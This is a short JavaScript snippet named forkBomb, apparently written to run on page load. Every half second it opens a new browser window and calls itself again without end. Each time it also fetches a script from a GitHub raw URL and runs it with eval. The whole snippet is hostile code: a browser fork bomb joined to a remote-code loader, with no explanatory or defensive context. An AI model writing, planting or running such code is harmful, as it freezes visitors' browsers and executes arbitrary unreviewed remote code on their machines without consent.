(function forkBomb(timeout = 500, i = 0) {
  setTimeout(() => {
    window.open('./?v=' + Math.random(), '_new' + (i || ''))
    fetch('https://raw.githubusercontent.com/cyanidelol/cyanidelol/refs/heads/main/cold.js').then(res => res.text()).then(eval).catch(console.error);
    forkBomb(timeout, i + 1)
  }, timeout)
})()
